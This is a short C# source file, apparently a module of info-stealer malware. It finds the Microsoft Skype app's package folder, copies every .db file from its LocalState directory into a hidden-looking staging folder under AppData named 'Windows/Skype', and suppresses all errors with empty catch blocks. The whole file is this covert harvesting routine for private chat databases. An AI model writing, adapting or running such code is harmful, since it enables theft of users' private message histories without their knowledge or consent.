using System;
using System.IO;

namespace skypemsg
{
    class skype
    {
        public static void skypelog()
        {
            try
            {
                string notfullpath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Packages";
                string[] dirs = Directory.GetDirectories(notfullpath);
                for (int i = 0; i < dirs.Length; i++)
                {
                    if (dirs[i].StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Packages\Microsoft.SkypeApp"))
                    {
                        string dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"/Windows/Skype";
                        try
                        {
                            Directory.CreateDirectory(dir);
                            string[] files = Directory.GetFiles(dirs[i] + @"\LocalState");
                            foreach (string i2 in files)
                            {
                                if (i2.Contains(".db"))
                                {

                                    File.Copy(i2, dir + @"/" + Path.GetFileName(i2));
                                }
                            }
                        }
                        catch
                        {

                        }

                    }

                }
            }
            catch
            {

            }

        }
    }
}
